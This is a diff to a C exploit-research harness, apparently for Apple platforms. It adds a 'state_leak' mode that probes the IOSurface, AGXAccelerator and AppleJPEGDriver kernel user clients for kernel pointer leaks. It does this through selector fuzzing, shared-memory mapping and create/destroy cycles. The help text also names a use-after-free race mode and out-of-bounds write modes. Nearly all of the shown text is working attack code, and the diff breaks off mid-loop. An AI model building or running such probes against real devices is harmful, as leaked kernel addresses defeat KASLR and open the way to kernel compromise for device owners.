@@ -14168,7 +14168,8 @@ vps_cd_done:
 
         rlog("\n=== MACH_PORT_LEAK complete ===\n");
 
-    } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0) {
+    } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0 ||
+               strcmp(mode, "state_leak") == 0) {
         goto new_modes;
 
     } else {
@@ -14230,6 +14231,7 @@ vps_cd_done:
         rlog("  mach_race [rounds] [groom] [threads] -- KEY: Mach port IOSurface UAF race\n");
         rlog("  sysctl_leak [rounds]               -- KEY: sysctl/proc_info kernel pointer probe\n");
         rlog("  ave_prop_scan [phase]              -- KEY: VT property scan for OOB read triggers\n");
+        rlog("  state_leak [phase]                 -- KEY: IOSurface/AGX/JPEG state management info leak\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -14875,6 +14877,646 @@ new_modes:
         }
 
         rlog("\n=== AVE_PROP_SCAN complete ===\n");
+
+    } else if (strcmp(mode, "state_leak") == 0) {
+        /*
+         * state_leak — CVE-2026-112665 pattern: IOKit state management info leak
+         *
+         * Probes IOSurface, AGXAccelerator, and AppleJPEGDriver for kernel
+         * pointer leaks through stale state after lifecycle transitions.
+         * Pattern: create object → operate → destroy/reconfigure → read back
+         * stale data containing kernel addresses.
+         *
+         * Phase 1: IOSurface struct method probe (all selectors with proper args)
+         * Phase 2: IOSurface create/destroy cycle with property readback
+         * Phase 3: IOSurface shared memory mapping analysis
+         * Phase 4: AGXAccelerator type 1 user client probe
+         * Phase 5: AppleJPEGDriver probe
+         * Phase 6: IOSurface cross-reference stale pointer detection
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+        rlog("=== STATE_LEAK: IOKit state management info leak probe ===\n");
+        rlog("phase=%d (0=all)\n\n", phase);
+
+        int kptr_found = 0;
+
+        /* Helper: scan buffer for kernel pointer patterns */
+        #define SCAN_KPTRS(buf, len, label) do { \
+            for (size_t _si = 0; _si + 7 < (len); _si++) { \
+                uint64_t _v = 0; \
+                memcpy(&_v, (uint8_t*)(buf) + _si, 8); \
+                if ((_v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL || \
+                    (_v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) { \
+                    if (_v != 0xFFFFFFFFFFFFFFFFULL && _v != 0xFFFFFFFE00000000ULL && \
+                        _v != 0xFFFFFFFF00000000ULL) { \
+                        rlog("  KPTR %s @%zu: 0x%016llx\n", (label), _si, _v); \
+                        kptr_found++; \
+                    } \
+                } \
+            } \
+        } while(0)
+
+        /* ===== Phase 1: IOSurface struct method data extraction ===== */
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: IOSurface struct method data extraction ---\n");
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            if (!svc) {
+                rlog("FAIL: IOSurfaceRoot not found\n");
+            } else {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                rlog("IOSurfaceRoot open: kr=0x%x conn=%d\n", kr, conn);
+
+                if (kr == KERN_SUCCESS && conn) {
+                    /* First create a surface via the user client to have valid state */
+                    /* IOSurface selector 0 = s_create_surface */
+                    /* Input is a serialized OSDictionary */
+
+                    /* Build a minimal surface creation dict as XML plist */
+                    const char *plist =
+                        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
+                        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
+                        "<plist version=\"1.0\"><dict>"
+                        "<key>IOSurfaceWidth</key><integer>64</integer>"
+                        "<key>IOSurfaceHeight</key><integer>64</integer>"
+                        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+                        "<key>IOSurfaceBytesPerRow</key><integer>256</integer>"
+                        "<key>IOSurfaceAllocSize</key><integer>16384</integer>"
+                        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+                        "</dict></plist>";
+
+                    /* Try creating surface via selector 0 with XML plist input */
+                    uint8_t out_buf[4096];
+                    memset(out_buf, 0xAA, sizeof(out_buf));
+                    size_t out_len = sizeof(out_buf);
+                    kr = IOConnectCallStructMethod(conn, 0, plist, strlen(plist),
+                                                   out_buf, &out_len);
+                    rlog("sel=0 (create): kr=0x%x out_len=%zu\n", kr, out_len);
+                    if (kr == KERN_SUCCESS && out_len > 0) {
+                        rlog("  create returned %zu bytes, scanning for KPTR:\n", out_len);
+                        SCAN_KPTRS(out_buf, out_len, "create_ret");
+                        /* Dump first 128 bytes hex */
+                        rlog("  hex: ");
+                        for (size_t hi = 0; hi < out_len && hi < 128; hi++)
+                            rlog("%02x", out_buf[hi]);
+                        rlog("\n");
+
+                        /* Extract surface ID from returned data (usually first 4 bytes) */
+                        uint32_t surf_id = 0;
+                        if (out_len >= 4) memcpy(&surf_id, out_buf, 4);
+                        rlog("  surface_id guess: %u\n", surf_id);
+                    }
+
+                    /* Probe all selectors 0-30 with struct method + empty input */
+                    rlog("\nStruct method probe (empty input, 4096-byte output):\n");
+                    for (uint32_t sel = 0; sel <= 30; sel++) {
+                        memset(out_buf, 0xAA, sizeof(out_buf));
+                        out_len = sizeof(out_buf);
+                        kr = IOConnectCallStructMethod(conn, sel, NULL, 0,
+                                                       out_buf, &out_len);
+                        if (kr == 0xe00002bc) continue; /* unsupported */
+                        rlog("  sel=%2u: kr=0x%08x out=%zu", sel, kr, out_len);
+                        if (kr == KERN_SUCCESS && out_len > 0) {
+                            rlog(" data:");
+                            for (size_t hi = 0; hi < out_len && hi < 32; hi++)
+                                rlog("%02x", out_buf[hi]);
+                            SCAN_KPTRS(out_buf, out_len, "sel_ret");
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Probe struct methods with small input buffers (4, 8, 16, 32 bytes) */
+                    rlog("\nStruct method probe (various input sizes):\n");
+                    uint8_t in_buf[64];
+                    for (uint32_t sel = 0; sel <= 30; sel++) {
+                        for (int isz = 4; isz <= 32; isz *= 2) {
+                            memset(in_buf, 0, sizeof(in_buf));
+                            memset(out_buf, 0xAA, sizeof(out_buf));
+                            out_len = sizeof(out_buf);
+                            kr = IOConnectCallStructMethod(conn, sel, in_buf, isz,
+                                                           out_buf, &out_len);
+                            if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                            rlog("  sel=%2u in=%d: kr=0x%08x out=%zu", sel, isz, kr, out_len);
+                            if (kr == KERN_SUCCESS && out_len > 0) {
+                                rlog(" data:");
+                                for (size_t hi = 0; hi < out_len && hi < 32; hi++)
+                                    rlog("%02x", out_buf[hi]);
+                                SCAN_KPTRS(out_buf, out_len, "struct_in");
+                            }
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Probe scalar methods with 1-6 input scalars */
+                    rlog("\nScalar method probe (1-6 inputs):\n");
+                    for (uint32_t sel = 0; sel <= 30; sel++) {
+                        for (uint32_t icnt = 1; icnt <= 6; icnt++) {
+                            uint64_t ins[6] = {0};
+                            uint64_t outs[16] = {0};
+                            uint32_t ocnt = 16;
+                            kr = IOConnectCallScalarMethod(conn, sel, ins, icnt, outs, &ocnt);
+                            if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                            rlog("  sel=%2u in_cnt=%u: kr=0x%08x outs=%u",
+                                 sel, icnt, kr, ocnt);
+                            if (ocnt > 0) {
+                                for (uint32_t oi = 0; oi < ocnt && oi < 4; oi++) {
+                                    rlog(" [%u]=0x%llx", oi, outs[oi]);
+                                    if ((outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                        (outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                        if (outs[oi] != 0xFFFFFFFFFFFFFFFFULL &&
+                                            outs[oi] != 0xFFFFFFFF00000000ULL) {
+                                            rlog(" <<<KPTR?>>>");
+                                            kptr_found++;
+                                        }
+                                    }
+                                }
+                            }
+                            rlog("\n");
+                        }
+                    }
+
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+            rlog("Phase 1 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 2: IOSurface lifecycle stale data ===== */
+        if (phase == 0 || phase == 2) {
+            rlog("--- Phase 2: IOSurface create/destroy stale data check ---\n");
+
+            /* Create surface via framework, record properties, destroy, create new,
+               check if stale kernel data from first surface leaks into second */
+            IOSurfaceRef surfs[8] = {0};
+            uint8_t surf_data[8][256];
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 64, h = 64, bpe = 4, bpr = 256;
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            int pf = 0x42475241;
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+            /* Create 8 surfaces rapidly, record base addresses and seed */
+            for (int i = 0; i < 8; i++) {
+                surfs[i] = IOSurfaceCreate(props);
+                if (surfs[i]) {
+                    IOSurfaceID sid = IOSurfaceGetID(surfs[i]);
+                    void *base = IOSurfaceGetBaseAddress(surfs[i]);
+                    IOSurfaceLock(surfs[i], 0, NULL);
+                    memset(surf_data[i], 0, 256);
+                    if (base) memcpy(surf_data[i], base, 256 < IOSurfaceGetAllocSize(surfs[i]) ? 256 : IOSurfaceGetAllocSize(surfs[i]));
+                    IOSurfaceUnlock(surfs[i], 0, NULL);
+                    rlog("  surf[%d]: id=%u base=%p alloc=%zu seed=%u\n",
+                         i, sid, base, IOSurfaceGetAllocSize(surfs[i]),
+                         IOSurfaceGetSeed(surfs[i]));
+                    /* Scan mapped memory for kernel pointers */
+                    SCAN_KPTRS(surf_data[i], 256, "surf_mapped");
+                }
+            }
+
+            /* Destroy odd surfaces, then create new ones in same slots */
+            rlog("\n  Destroying odd surfaces and re-creating...\n");
+            for (int i = 1; i < 8; i += 2) {
+                if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+            }
+            usleep(10000); /* small delay for kernel cleanup */
+            for (int i = 1; i < 8; i += 2) {
+                surfs[i] = IOSurfaceCreate(props);
+                if (surfs[i]) {
+                    IOSurfaceID sid = IOSurfaceGetID(surfs[i]);
+                    void *base = IOSurfaceGetBaseAddress(surfs[i]);
+                    IOSurfaceLock(surfs[i], 0, NULL);
+                    uint8_t new_data[256] = {0};
+                    if (base) memcpy(new_data, base, 256 < IOSurfaceGetAllocSize(surfs[i]) ? 256 : IOSurfaceGetAllocSize(surfs[i]));
+                    IOSurfaceUnlock(surfs[i], 0, NULL);
+                    rlog("  reuse[%d]: id=%u base=%p seed=%u\n",
+                         i, sid, base, IOSurfaceGetSeed(surfs[i]));
+                    SCAN_KPTRS(new_data, 256, "reuse_mapped");
+
+                    /* Check if any bytes from old surface leaked */
+                    int stale = 0;
+                    for (int b = 0; b < 256; b++) {
+                        if (new_data[b] == surf_data[i][b] && new_data[b] != 0)
+                            stale++;
+                    }
+                    if (stale > 8)
+                        rlog("  WARNING: %d stale bytes from previous surface!\n", stale);
+                }
+            }
+
+            /* Cleanup */
+            for (int i = 0; i < 8; i++)
+                if (surfs[i]) CFRelease(surfs[i]);
+            CFRelease(props); CFRelease(wn); CFRelease(hn);
+            CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+            rlog("Phase 2 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 3: IOSurface property get/set stale state ===== */
+        if (phase == 0 || phase == 3) {
+            rlog("--- Phase 3: IOSurface property get/set stale state ---\n");
+
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn = 0;
+            kern_return_t kr = 0;
+            if (svc) kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+
+            if (svc && kr == KERN_SUCCESS && conn) {
+                /* Use IOSurface framework to create a surface first */
+                CFMutableDictionaryRef p3 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w3 = 128, h3 = 128, b3 = 4, r3 = 512;
+                CFNumberRef w3n = CFNumberCreate(NULL, kCFNumberIntType, &w3);
+                CFNumberRef h3n = CFNumberCreate(NULL, kCFNumberIntType, &h3);
+                CFNumberRef b3n = CFNumberCreate(NULL, kCFNumberIntType, &b3);
+                CFNumberRef r3n = CFNumberCreate(NULL, kCFNumberIntType, &r3);
+                int pf3 = 0x42475241;
+                CFNumberRef pf3n = CFNumberCreate(NULL, kCFNumberIntType, &pf3);
+                CFDictionarySetValue(p3, CFSTR("IOSurfaceWidth"), w3n);
+                CFDictionarySetValue(p3, CFSTR("IOSurfaceHeight"), h3n);
+                CFDictionarySetValue(p3, CFSTR("IOSurfaceBytesPerElement"), b3n);
+                CFDictionarySetValue(p3, CFSTR("IOSurfaceBytesPerRow"), r3n);
+                CFDictionarySetValue(p3, CFSTR("IOSurfacePixelFormat"), pf3n);
+
+                IOSurfaceRef s = IOSurfaceCreate(p3);
+                if (s) {
+                    IOSurfaceID sid = IOSurfaceGetID(s);
+                    rlog("Created surface id=%u for property tests\n", sid);
+
+                    /* Use selector 6 (s_lookup) with surface ID to get reference */
+                    uint64_t lookup_in[1] = {sid};
+                    uint64_t lookup_out[16] = {0};
+                    uint32_t lookup_cnt = 16;
+                    kr = IOConnectCallScalarMethod(conn, 6, lookup_in, 1,
+                                                   lookup_out, &lookup_cnt);
+                    rlog("  lookup(id=%u): kr=0x%x outs=%u", sid, kr, lookup_cnt);
+                    for (uint32_t oi = 0; oi < lookup_cnt && oi < 4; oi++) {
+                        rlog(" [%u]=0x%llx", oi, lookup_out[oi]);
+                        if ((lookup_out[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (lookup_out[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (lookup_out[oi] != 0xFFFFFFFFFFFFFFFFULL) {
+                                rlog(" <<<KPTR?>>>");
+                                kptr_found++;
+                            }
+                        }
+                    }
+                    rlog("\n");
+
+                    /* Try get_value (selector 9) with known property keys */
+                    const char *prop_keys[] = {
+                        "IOSurfaceWidth", "IOSurfaceHeight", "IOSurfaceAllocSize",
+                        "IOSurfaceAddress", "IOSurfaceKernelAddress",
+                        "IOSurfacePhysicalAddress", "IOSurfaceMapOffset",
+                        "IOSurfaceGlobalID", "IOSurfaceRegistryID",
+                        "IOSurfaceOwnerPID", "IOSurfaceAllocTag",
+                        NULL
+                    };
+                    rlog("\n  Property readback via selector 9 (get_value):\n");
+                    for (int ki = 0; prop_keys[ki]; ki++) {
+                        /* Build plist for get_value: surface ID + key name */
+                        char req[512];
+                        snprintf(req, sizeof(req),
+                            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
+                            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
+                            "<plist version=\"1.0\"><dict>"
+                            "<key>IOSurfaceID</key><integer>%u</integer>"
+                            "<key>IOSurfacePropertyKey</key><string>%s</string>"
+                            "</dict></plist>",
+                            sid, prop_keys[ki]);
+                        uint8_t gv_out[1024];
+                        memset(gv_out, 0xAA, sizeof(gv_out));
+                        size_t gv_len = sizeof(gv_out);
+                        kr = IOConnectCallStructMethod(conn, 9, req, strlen(req),
+                                                       gv_out, &gv_len);
+                        if (kr != 0xe00002bc) {
+                            rlog("    %-32s: kr=0x%08x len=%zu", prop_keys[ki], kr, gv_len);
+                            if (kr == KERN_SUCCESS && gv_len > 0) {
+                                rlog(" hex:");
+                                for (size_t hi = 0; hi < gv_len && hi < 32; hi++)
+                                    rlog("%02x", gv_out[hi]);
+                                SCAN_KPTRS(gv_out, gv_len, prop_keys[ki]);
+                            }
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Lock/unlock cycle then re-read properties */
+                    rlog("\n  After lock/unlock cycle:\n");
+                    IOSurfaceLock(s, 0, NULL);
+                    void *base = IOSurfaceGetBaseAddress(s);
+                    if (base) {
+                        memset(base, 0x42, IOSurfaceGetAllocSize(s));
+                    }
+                    IOSurfaceUnlock(s, 0, NULL);
+                    IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
+                    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
+
+                    /* Re-read surface info through user client */
+                    uint64_t info_in[1] = {sid};
+                    uint64_t info_out[16] = {0};
+                    uint32_t info_cnt = 16;
+                    kr = IOConnectCallScalarMethod(conn, 6, info_in, 1,
+                                                   info_out, &info_cnt);
+                    rlog("  post-cycle lookup: kr=0x%x outs=%u", kr, info_cnt);
+                    for (uint32_t oi = 0; oi < info_cnt && oi < 4; oi++) {
+                        rlog(" [%u]=0x%llx", oi, info_out[oi]);
+                    }
+                    rlog("\n");
+
+                    CFRelease(s);
+                }
+                CFRelease(p3); CFRelease(w3n); CFRelease(h3n);
+                CFRelease(b3n); CFRelease(r3n); CFRelease(pf3n);
+                IOServiceClose(conn);
+            }
+            if (svc) IOObjectRelease(svc);
+            rlog("Phase 3 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 4: AGXAccelerator type 1 probe ===== */
+        if (phase == 0 || phase == 4) {
+            rlog("--- Phase 4: AGXAccelerator type 1 user client probe ---\n");
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
+            if (!svc) {
+                rlog("AGXAccelerator not found\n");
+            } else {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+                rlog("AGXAccelerator type 1 open: kr=0x%x conn=%d\n", kr, conn);
+
+                if (kr == KERN_SUCCESS && conn) {
+                    /* Probe scalar methods */
+                    rlog("Scalar method probe:\n");
+                    for (uint32_t sel = 0; sel < 40; sel++) {
+                        uint64_t outs[16] = {0};
+                        uint32_t ocnt = 16;
+                        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, outs, &ocnt);
+                        if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                        rlog("  sel=%2u: kr=0x%08x outs=%u", sel, kr, ocnt);
+                        for (uint32_t oi = 0; oi < ocnt && oi < 4; oi++) {
+                            rlog(" [%u]=0x%llx", oi, outs[oi]);
+                            if ((outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (outs[oi] != 0xFFFFFFFFFFFFFFFFULL &&
+                                    outs[oi] != 0xFFFFFFFF00000000ULL) {
+                                    rlog(" <<<KPTR?>>>");
+                                    kptr_found++;
+                                }
+                            }
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Probe struct methods */
+                    rlog("\nStruct method probe:\n");
+                    for (uint32_t sel = 0; sel < 40; sel++) {
+                        uint8_t obuf[4096];
+                        memset(obuf, 0xAA, sizeof(obuf));
+                        size_t olen = sizeof(obuf);
+                        kr = IOConnectCallStructMethod(conn, sel, NULL, 0, obuf, &olen);
+                        if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                        rlog("  sel=%2u: kr=0x%08x out=%zu", sel, kr, olen);
+                        if (kr == KERN_SUCCESS && olen > 0) {
+                            rlog(" hex:");
+                            for (size_t hi = 0; hi < olen && hi < 48; hi++)
+                                rlog("%02x", obuf[hi]);
+                            SCAN_KPTRS(obuf, olen, "agx_struct");
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Try with small struct inputs */
+                    rlog("\nStruct with inputs:\n");
+                    for (uint32_t sel = 0; sel < 40; sel++) {
+                        uint8_t ibuf[32] = {0};
+                        uint8_t obuf[4096];
+                        memset(obuf, 0xAA, sizeof(obuf));
+                        size_t olen = sizeof(obuf);
+                        kr = IOConnectCallStructMethod(conn, sel, ibuf, 8, obuf, &olen);
+                        if (kr == 0xe00002bc || kr == 0xe00002c2 ||
+                            kr == 0xe00002c7) continue;
+                        rlog("  sel=%2u in=8: kr=0x%08x out=%zu", sel, kr, olen);
+                        if (kr == KERN_SUCCESS && olen > 0) {
+                            rlog(" hex:");
+                            for (size_t hi = 0; hi < olen && hi < 48; hi++)
+                                rlog("%02x", obuf[hi]);
+                            SCAN_KPTRS(obuf, olen, "agx_in8");
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Shared memory mapping probe */
+                    rlog("\nShared memory map probe:\n");
+                    for (uint32_t mtype = 0; mtype < 8; mtype++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t sz = 0;
+                        kr = IOConnectMapMemory64(conn, mtype, mach_task_self(),
+                                                   &addr, &sz, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS && addr && sz > 0) {
+                            rlog("  type=%u: addr=0x%llx size=0x%llx\n",
+                                 mtype, (uint64_t)addr, (uint64_t)sz);
+                            /* Scan first 4096 bytes of mapped memory for KPTR */
+                            size_t scan_sz = sz < 4096 ? (size_t)sz : 4096;
+                            SCAN_KPTRS((void*)(uintptr_t)addr, scan_sz, "agx_shmem");
+                            /* Dump first 64 bytes */
+                            rlog("  hex: ");
+                            for (size_t hi = 0; hi < 64 && hi < scan_sz; hi++)
+                                rlog("%02x", ((uint8_t*)(uintptr_t)addr)[hi]);
+                            rlog("\n");
+                            IOConnectUnmapMemory64(conn, mtype, mach_task_self(), addr);
+                        } else if (kr != 0xe00002bc && kr != 0xe00002c2) {
+                            rlog("  type=%u: kr=0x%08x\n", mtype, kr);
+                        }
+                    }
+
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+            rlog("Phase 4 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 5: AppleJPEGDriver probe ===== */
+        if (phase == 0 || phase == 5) {
+            rlog("--- Phase 5: AppleJPEGDriver user client probe ---\n");
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("AppleJPEGDriver"));
+            if (!svc) {
+                rlog("AppleJPEGDriver not found\n");
+            } else {
+                /* Try both type 0 and type 1 */
+                for (int utype = 0; utype <= 1; utype++) {
+                    io_connect_t conn = 0;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), utype, &conn);
+                    rlog("AppleJPEGDriver type %d: kr=0x%x conn=%d\n", utype, kr, conn);
+                    if (kr != KERN_SUCCESS || !conn) continue;
+
+                    /* Scalar probe */
+                    for (uint32_t sel = 0; sel < 20; sel++) {
+                        uint64_t outs[16] = {0};
+                        uint32_t ocnt = 16;
+                        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, outs, &ocnt);
+                        if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                        rlog("  t%d sel=%2u scalar: kr=0x%08x outs=%u",
+                             utype, sel, kr, ocnt);
+                        for (uint32_t oi = 0; oi < ocnt && oi < 4; oi++) {
+                            rlog(" [%u]=0x%llx", oi, outs[oi]);
+                            if ((outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (outs[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (outs[oi] != 0xFFFFFFFFFFFFFFFFULL) {
+                                    rlog(" <<<KPTR?>>>");
+                                    kptr_found++;
+                                }
+                            }
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Struct probe */
+                    for (uint32_t sel = 0; sel < 20; sel++) {
+                        uint8_t obuf[4096];
+                        memset(obuf, 0xAA, sizeof(obuf));
+                        size_t olen = sizeof(obuf);
+                        kr = IOConnectCallStructMethod(conn, sel, NULL, 0, obuf, &olen);
+                        if (kr == 0xe00002bc || kr == 0xe00002c2) continue;
+                        rlog("  t%d sel=%2u struct: kr=0x%08x out=%zu",
+                             utype, sel, kr, olen);
+                        if (kr == KERN_SUCCESS && olen > 0) {
+                            rlog(" hex:");
+                            for (size_t hi = 0; hi < olen && hi < 48; hi++)
+                                rlog("%02x", obuf[hi]);
+                            SCAN_KPTRS(obuf, olen, "jpeg_struct");
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Shared memory */
+                    rlog("  Shared memory probe:\n");
+                    for (uint32_t mtype = 0; mtype < 4; mtype++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t sz = 0;
+                        kr = IOConnectMapMemory64(conn, mtype, mach_task_self(),
+                                                   &addr, &sz, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS && addr && sz > 0) {
+                            rlog("    type=%u: addr=0x%llx size=0x%llx\n",
+                                 mtype, (uint64_t)addr, (uint64_t)sz);
+                            size_t scan_sz = sz < 4096 ? (size_t)sz : 4096;
+                            SCAN_KPTRS((void*)(uintptr_t)addr, scan_sz, "jpeg_shmem");
+                            rlog("    hex: ");
+                            for (size_t hi = 0; hi < 64 && hi < scan_sz; hi++)
+                                rlog("%02x", ((uint8_t*)(uintptr_t)addr)[hi]);
+                            rlog("\n");
+                            IOConnectUnmapMemory64(conn, mtype, mach_task_self(), addr);
+                        }
+                    }
+
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+            rlog("Phase 5 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 6: IOSurface rapid lifecycle KPTR detection ===== */
+        if (phase == 0 || phase == 6) {
+            rlog("--- Phase 6: Rapid IOSurface lifecycle + stale pointer check ---\n");
+
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn = 0;
+            kern_return_t kr = 0;
+            if (svc) kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+
+            if (svc && kr == KERN_SUCCESS && conn) {
+                /* Rapidly create/destroy surfaces and read back state each time */
+                uint64_t prev_vals[16] = {0};
+                int drift_count = 0;
+
+                for (int round = 0; round < 50; round++) {
+                    CFMutableDictionaryRef rp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int rw = 32 + (round % 8) * 32;
+                    int rh = 32;
+                    int rb = 4, rbr = rw * 4;
+                    CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &rw);
+                    CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &rh);
+                    CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &rb);
+                    CFNumberRef rbrn = CFNumberCreate(NULL, kCFNumberIntType, &rbr);
+                    int rpf = 0x42475241;
+                    CFNumberRef rpfn = CFNumberCreate(NULL, kCFNumberIntType, &rpf);
+                    CFDictionarySetValue(rp, CFSTR("IOSurfaceWidth"), rwn);
+                    CFDictionarySetValue(rp, CFSTR("IOSurfaceHeight"), rhn);
+                    CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerElement"), rbn);
+                    CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerRow"), rbrn);
+                    CFDictionarySetValue(rp, CFSTR("IOSurfacePixelFormat"), rpfn);
+
+                    IOSurfaceRef rs = IOSurfaceCreate(rp);
+                    if (rs) {
+                        IOSurfaceID rid = IOSurfaceGetID(rs);
+
+                        /* Read back via user client selector 6 */
+                        uint64_t lin[1] = {rid};
+                        uint64_t lout[16] = {0};
+                        uint32_t lcnt = 16;
+                        kr = IOConnectCallScalarMethod(conn, 6, lin, 1, lout, &lcnt);
+
+                        if (round == 0) {
+                            rlog("  round %d: id=%u lookup kr=0x%x outs=%u",
+                                 round, rid, kr, lcnt);
+                            for (uint32_t oi = 0; oi < lcnt && oi < 4; oi++)
+                                rlog(" [%u]=0x%llx", oi, lout[oi]);
+                            rlog("\n");
+                        }
+
+                        /* Check if any output values look like KPTR */
+                        for (uint32_t oi = 0; oi < lcnt && oi < 16; oi++) {
+                            if ((lout[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (lout[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (lout[oi] != 0xFFFFFFFFFFFFFFFFULL &&
+                                    lout[oi] != 0xFFFFFFFF00000000ULL) {
+                                    rlog("  KPTR round %d [%u]=0x%llx\n",
+                                         round, oi, lout[oi]);
+                                    kptr_found++;
+                                }
+                            }
+                            /* Track drift: values that change between rounds */
+                            if (round > 0 && lout[oi] != prev_vals[oi] && lout[oi] != 0) {
+                                if (drift_count < 20)
+                                    rlog("  drift round %d [%u]: 0x%llx -> 0x%llx\n",
+                                         round, oi, prev_vals[oi], lout[oi]);
+                                drift_count++;
+                            }
+                        }
+                        memcpy(prev_vals, lout, sizeof(prev_vals));
+
+                        CFRelease(rs);
+                    }
+                    CFRelease(rp); CFRelease(rwn); CFRelease(rhn);
+                    CFRelease(rbn); CFRelease(rbrn); CFRelease(rpfn);
+                }
